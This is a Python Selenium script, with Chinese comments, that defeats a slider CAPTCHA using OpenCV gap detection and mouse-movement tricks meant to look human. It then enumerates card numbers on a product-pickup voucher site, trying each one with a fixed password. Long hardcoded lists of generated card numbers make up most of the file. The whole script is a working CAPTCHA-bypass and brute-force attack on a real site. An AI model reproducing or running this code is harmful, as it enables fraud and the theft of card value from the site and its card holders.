import base64
import random
import time

import cv2
import numpy as np
from PIL import Image
from selenium.webdriver.common.by import By
from selenium.webdriver import ActionChains

import compare_cv2
import crop_cv
from utils.driver import driver


class Crab:
    """ 防水墙滑动验证码破解 使用OpenCV库 成功率大概90%左右"""

    def __init__(self):
        # 提货平台官网
        self.url = "http://xrj.360xie.cn"
        self.driver = driver
        self.driver.implicitly_wait(5)

    @staticmethod
    def get_position(chunk, canves):
        """ 判断缺口位置 :param chunk: 缺口图片是原图 :param canves: :return: 位置 x, y """
        target = cv2.imread(chunk, 0)
        template = cv2.imread(canves, 0)
        # w, h = target.shape[::-1]
        temp = 'temp.jpg'
        targ = 'targ.jpg'
        cv2.imwrite(temp, template)
        cv2.imwrite(targ, target)
        target = cv2.imread(targ)
        target = cv2.cvtColor(target, cv2.COLOR_BGR2GRAY)
        target = abs(255 - target)
        cv2.imwrite(targ, target)

        target = cv2.imread(targ)
        template = cv2.imread(temp)
        print("target: ", target)
        print("template: ", template)
        result = cv2.matchTemplate(target, template, cv2.TM_CCOEFF_NORMED)
        x, y = np.unravel_index(result.argmax(), result.shape)
        return x, y

    @staticmethod
    def get_track(distance):
        """ 模拟轨迹 假装是人在操作 :param distance: :return: """
        # 初速度
        v = 1
        # 单位时间为0.2s来统计轨迹，轨迹即0.2内的位移
        t = 0.2
        # 位移/轨迹列表，列表内的一个元素代表0.2s的位移
        tracks = []
        # 当前的位移
        current = 0
        # 到达mid值开始减速
        mid = distance * 7 / 8
        distance += 10  # 先滑过一点，最后再反着滑动回来
        # a = random.randint(1,3)
        while current < distance:
            # if current < mid:
            #     # 加速度越小，单位时间的位移越小,模拟的轨迹就越多越详细
            #     a = random.randint(2, 4)  # 加速运动
            # else:
            #     a = -random.randint(3, 5)  # 减速运动

            a = random.randint(2, 4)
            # 初速度
            v0 = v
            # 0.2秒时间内的位移
            s = v0 * t + 2 * a * (t ** 2)
            # 当前的位置
            current += s
            # 添加到轨迹列表
            tracks.append(round(s))
            # 速度已经达到v,该速度作为下次的初速度
            v = v0 + a * t
        # 反着滑动到大概准确位置
        for i in range(4):
            tracks.append(-random.randint(2, 3))
        for i in range(4):
            tracks.append(-random.randint(1, 3))
        return tracks

    @staticmethod
    def urllib_download(imgurl, imgsavepath):
        """ 下载图片 :param imgurl: 图片url :param imgsavepath: 存放地址 :return: """
        from urllib.request import urlretrieve
        urlretrieve(imgurl, imgsavepath)

    def login_main(self, no_list):
        driver = self.driver
        driver.implicitly_wait(5)
        driver.get(self.url)
        # driver.maximize_window()

        for no in no_list:
            print("当前尝试的卡号：" + no)
            know_btn = driver.find_element(By.XPATH, '//*[@id="aNext"]')
            know_btn.click()
            card_no = driver.find_element(By.ID, 'txtCardNo')
            card_no.send_keys(no)
            card_psw = driver.find_element(By.ID, 'txtCardPsw')
            card_psw.send_keys("334114")
            # 334114 884114 834114
            btn_search = driver.find_element(By.ID, 'btnSearch')
            btn_search.click()

            # 等待，避免下载图片时图片未加载完毕，导致下载图片为空
            time.sleep(2)
            # 下载完整的滑动拼图
            # bk_block = driver.find_element(By.XPATH, '//img[@id="slideBg"]').get_attribute('src')  # 大图 url
            js = f'''return document.getElementsByTagName("canvas")[0].toDataURL("image/png");'''  # 数字表示第几个canvas
            base64str = driver.execute_script(js)
            page = base64str.split(',')[1]  # 去除前缀无用信息
            imagedata_bkBlock = base64.b64decode(page)
            with open("./img/bkBlock.png", "wb+") as f:
                f.write(imagedata_bkBlock)
                f.close()
            time.sleep(1)

            # 下载小滑块图
            # slide_block = driver.find_element(By.XPATH, '//img[@id="slideBlock"]').get_attribute('src')  # 小滑块 图片url
            js = f'''return document.getElementsByTagName("canvas")[1].toDataURL("image/png");'''  # 数字表示第几个canvas
            base64str = driver.execute_script(js)
            page = base64str.split(',')[1]  # 去除前缀无用信息
            imagedata_slideBlock = base64.b64decode(page)
            with open("./img/slideBlock.png", "wb+") as f:  # 下载大大图
                f.write(imagedata_slideBlock)
                f.close()
            time.sleep(1)

            slid_ing = driver.find_element(By.XPATH, '//*[@id="captcha"]/div[2]/div/div')  # 滑块

            # 处理侧边栏图片
            crop_cv.main()

            # 使用opencv识别缺口位置，并移动滑块
            img_bkblock = Image.open('./img/bkBlock.png')
            real_width = img_bkblock.size[0]
            # print("real_width: ", real_width)
            # width_scale = float(real_width) / float(web_image_width)
            width_scale = 1.0
            # print("width_scale: ", width_scale)

            position = compare_cv2.identify_gap('./img/search_background.png', './img/tp.png', './img/out.png')
            # print("position: ", position)
            # real_position = position[1] / width_scale
            # real_position = real_position - (slide_block_x - bk_block_x)
            if position > 270:
                real_position = position + 17
            elif position > 200:
                real_position = position + 13
            elif position < 100:
                real_position = position + 4
            else:
                real_position = position + 8
            # print("real_position: ", real_position)

            # track_list = self.get_track(real_position + 4)
            # print("track_list: ", track_list)
            ActionChains(driver).click_and_hold(on_element=slid_ing).perform()  # 点击鼠标左键，按住不放
            time.sleep(0.2)
            ActionChains(driver).move_by_offset(xoffset=real_position, yoffset=0).perform()
            # print('第二步,拖动元素')
            # for track in track_list:
            #     ActionChains(driver).move_by_offset(xoffset=track, yoffset=0).perform()  # 鼠标移动到距离当前位置（x,y）
            #     time.sleep(0.002)
            ActionChains(driver).move_by_offset(xoffset=-random.randint(0, 1), yoffset=0).perform() # 微调，根据实际情况微调
            time.sleep(0.2)
            # print('第三步,释放鼠标')
            ActionChains(driver).release(on_element=slid_ing).perform()
            time.sleep(2)

            print(driver.switch_to.alert.text)
            driver.switch_to.alert.accept()

        driver.close()

    @staticmethod
    def random_no():
        head = "22118800"
        result = []
        first = [0, 3, 5, 6, 8, 9]
        second = [0, 2, 3, 5, 6, 8, 9]
        last = [1, 2, 4, 5, 7, 9]
        for i in first:
            for j in second:
                for m in last:
                    res = head + str(i) + "0" + str(j) + str(m)
                    result.append(res)
        return result


if __name__ == '__main__':
    c = Crab()
    NO_list = ['221188006001', '221188006002', '221188006004', '221188006005', '221188006007', '221188006009', '221188006021', '221188006022', '221188006024', '221188006025', '221188006027', '221188006029', '221188006031', '221188006032', '221188006034', '221188006035', '221188006037', '221188006039', '221188006051', '221188006052', '221188006054', '221188006055', '221188006057', '221188006059', '221188006061', '221188006062', '221188006064', '221188006065', '221188006067', '221188006069', '221188006081', '221188006082', '221188006084', '221188006085', '221188006087', '221188006089', '221188006091', '221188006092', '221188006094', '221188006095', '221188006097', '221188006099', '221188008001', '221188008002', '221188008004', '221188008005', '221188008007', '221188008009', '221188008021', '221188008022', '221188008024', '221188008025', '221188008027', '221188008029', '221188008031', '221188008032', '221188008034', '221188008035', '221188008037', '221188008039', '221188008051', '221188008052', '221188008054', '221188008055', '221188008057', '221188008059', '221188008061', '221188008062', '221188008064', '221188008065', '221188008067', '221188008069', '221188008081', '221188008082', '221188008084', '221188008085', '221188008087', '221188008089', '221188008091', '221188008092', '221188008094', '221188008095', '221188008097', '221188008099', '221188009001', '221188009002', '221188009004', '221188009005', '221188009007', '221188009009', '221188009021', '221188009022', '221188009024', '221188009025', '221188009027', '221188009029', '221188009031', '221188009032', '221188009034', '221188009035', '221188009037', '221188009039', '221188009051', '221188009052', '221188009054', '221188009055', '221188009057', '221188009059', '221188009061', '221188009062', '221188009064', '221188009065', '221188009067', '221188009069', '221188009081', '221188009082', '221188009084', '221188009085', '221188009087', '221188009089', '221188009091', '221188009092', '221188009094', '221188009095', '221188009097', '221188009099']
    # NO_list = ['221188000001', '221188000002', '221188000004', '221188000005', '221188000007', '221188000009', '221188000021', '221188000022', '221188000024', '221188000025', '221188000027', '221188000029', '221188000031', '221188000032', '221188000034', '221188000035', '221188000037', '221188000039', '221188000051', '221188000052', '221188000054', '221188000055', '221188000057', '221188000059', '221188000061', '221188000062', '221188000064', '221188000065', '221188000067', '221188000069', '221188000081', '221188000082', '221188000084', '221188000085', '221188000087', '221188000089', '221188000091', '221188000092', '221188000094', '221188000095', '221188000097', '221188000099', '221188003001', '221188003002', '221188003004', '221188003005', '221188003007', '221188003009', '221188003021', '221188003022', '221188003024', '221188003025', '221188003027', '221188003029', '221188003031', '221188003032', '221188003034', '221188003035', '221188003037', '221188003039', '221188003051', '221188003052', '221188003054', '221188003055', '221188003057', '221188003059', '221188003061', '221188003062', '221188003064', '221188003065', '221188003067', '221188003069', '221188003081', '221188003082', '221188003084', '221188003085', '221188003087', '221188003089', '221188003091', '221188003092', '221188003094', '221188003095', '221188003097', '221188003099', '221188005001', '221188005002', '221188005004', '221188005005', '221188005007', '221188005009', '221188005021', '221188005022', '221188005024', '221188005025', '221188005027', '221188005029', '221188005031', '221188005032', '221188005034', '221188005035', '221188005037', '221188005039', '221188005051', '221188005052', '221188005054', '221188005055', '221188005057', '221188005059', '221188005061', '221188005062', '221188005064', '221188005065', '221188005067', '221188005069', '221188005081', '221188005082', '221188005084', '221188005085', '221188005087', '221188005089', '221188005091', '221188005092', '221188005094', '221188005095', '221188005097', '221188005099', '221188006001', '221188006002', '221188006004', '221188006005', '221188006007', '221188006009', '221188006021', '221188006022', '221188006024', '221188006025', '221188006027', '221188006029', '221188006031', '221188006032', '221188006034', '221188006035', '221188006037', '221188006039', '221188006051', '221188006052', '221188006054', '221188006055', '221188006057', '221188006059', '221188006061', '221188006062', '221188006064', '221188006065', '221188006067', '221188006069', '221188006081', '221188006082', '221188006084', '221188006085', '221188006087', '221188006089', '221188006091', '221188006092', '221188006094', '221188006095', '221188006097', '221188006099', '221188008001', '221188008002', '221188008004', '221188008005', '221188008007', '221188008009', '221188008021', '221188008022', '221188008024', '221188008025', '221188008027', '221188008029', '221188008031', '221188008032', '221188008034', '221188008035', '221188008037', '221188008039', '221188008051', '221188008052', '221188008054', '221188008055', '221188008057', '221188008059', '221188008061', '221188008062', '221188008064', '221188008065', '221188008067', '221188008069', '221188008081', '221188008082', '221188008084', '221188008085', '221188008087', '221188008089', '221188008091', '221188008092', '221188008094', '221188008095', '221188008097', '221188008099', '221188009001', '221188009002', '221188009004', '221188009005', '221188009007', '221188009009', '221188009021', '221188009022', '221188009024', '221188009025', '221188009027', '221188009029', '221188009031', '221188009032', '221188009034', '221188009035', '221188009037', '221188009039', '221188009051', '221188009052', '221188009054', '221188009055', '221188009057', '221188009059', '221188009061', '221188009062', '221188009064', '221188009065', '221188009067', '221188009069', '221188009081', '221188009082', '221188009084', '221188009085', '221188009087', '221188009089', '221188009091', '221188009092', '221188009094', '221188009095', '221188009097', '221188009099']
    c.login_main(NO_list)
